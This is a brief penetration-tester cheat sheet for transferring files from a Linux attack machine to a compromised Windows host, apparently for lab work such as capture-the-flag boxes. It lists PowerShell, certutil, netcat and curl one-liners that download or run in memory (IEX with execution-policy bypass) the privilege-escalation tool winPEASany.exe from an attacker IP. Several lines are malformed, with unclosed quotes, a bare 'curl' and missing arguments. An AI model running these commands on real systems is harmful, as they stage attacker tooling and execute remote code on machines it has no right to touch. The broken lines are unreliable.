Linux to Windows

# Linux to Windows

**On linux(On Specific Directory)**
`python3 -m SimpleHTTPServer 8001`

**On Windows**
Powsershell
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
powershell.exe "IEX (New-Object System.Net.WebClient).DownloadString('<URL>')"
powershell "wget <URL>"
```
NETCAT
```
nc -lvp 1234 > <OUT_FILE> 
nc <IP> 1234 < <IN_FILE>
```

CURL
```curl <URL> -o <OUT_FILE>```

```bash
powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10:8001/winPEASany.exe','win.exe')
powershell "wget http://10.10.14.10:8001/winPEASany.exe"
curl

powershell "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.10:8001/winPEASany.exe')"

powershell -exec bypass -Command "& {iex((New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10:8001/winPEASany.exe','C:/win.exe'));}"

certutil -urlcache -f http://10.10.14.10:8001/winPEASany.exe
powershell -c "Invoke-WebRequest -Uri http://10.10.14.10:8001/winPEASany.exe"
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.10:8001/winPEASany.exe')"

powershell -Command ((new-object System.Net.WebClient).Downloadfile('http://10.10.14.10:8001/winPEASany.exe

powershell Invoke-WebRequest -Uri http://10.10.14.10:8001/winPEASany.exe -OutFile c:\Users\Public\Documents\winPEASany.exe

```